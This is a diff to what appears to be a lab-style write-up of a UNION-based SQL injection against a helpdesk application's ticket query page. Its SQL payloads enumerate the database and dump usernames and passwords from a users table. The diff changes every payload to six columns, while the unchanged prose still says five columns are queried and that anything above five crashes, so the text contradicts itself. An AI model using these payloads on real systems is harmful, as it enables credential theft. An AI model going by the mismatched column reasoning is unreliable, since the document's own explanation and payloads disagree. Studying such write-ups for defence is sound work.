@@ -45,39 +45,39 @@ When a ticket is queried successfully it'll return the table columns. The table 
 As there are a total of 5 columns returned in [[query_ticket.php]], the actor would try enumerate the actual total columns queried via the SQL statement with the exploit of `
 `ORDER BY {number}` 
 ```sql
-1 ORDER BY 5
+1 ORDER BY 6
 ```
 
 Anything above 5 column would results in a crash, hence the actor is aware that the total column queried is 5. The actor would try the following to test their theory and check if it's working. 
 ```Sql
-1 UNION SELECT 1,2,3,4,5
+1 UNION SELECT 1,2,3,4,5,6
 ```
 
 The results printed out the numbers in order, verifying that the SQLi attack had worked. The actor would start enumerating the database to find out the database, version_name, user, tables within the database.
 
 Finding the actual table name (database), version of the SQLi server and the logged on user.
 ``` sql
-100 UNION SELECT database(), version(), user(), 4,5-- 
+100 UNION SELECT database(), version(), user(), 4,5,6-- 
 ```
 
 Enumerating tables
 ```sql
-100 UNION SELECT 1,schema_name, 3,4,5 FROM information_schema.schemata-- 
+100 UNION SELECT 1,schema_name, 3,4,5,6 FROM information_schema.schemata-- 
 ```
 
 Dumping the tables within 'palessi_helpdesk' database.
 ```sql
-100 UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables WHERE table_schema='palessi_helpdesk'
+100 UNION SELECT 1,table_name,3,4,5,6 FROM information_schema.tables WHERE table_schema='palessi_helpdesk'
 ```
 
 Dumping the fields within 'users' table
 ```sql
-100 UNION SELECT 1,GROUP_CONCAT(column_name SEPARATOR ', '),3,4,5 FROM information_schema.columns WHERE table_schema='palessi_helpdesk' AND table_name='users'
+100 UNION SELECT 1,GROUP_CONCAT(column_name SEPARATOR ', '),3,4,5,6 FROM information_schema.columns WHERE table_schema='palessi_helpdesk' AND table_name='users'
 ```
 
 Dumping the username and password
 ```sql
-100 UNION SELECT 1,GROUP_CONCAT(username,0x3a,password SEPARATOR '<br>'),3,4,5 FROM palessi_helpdesk.users
+100 UNION SELECT 1,GROUP_CONCAT(username,0x3a,password SEPARATOR '<br>'),3,4,5,6 FROM palessi_helpdesk.users
 ```
 
 ---
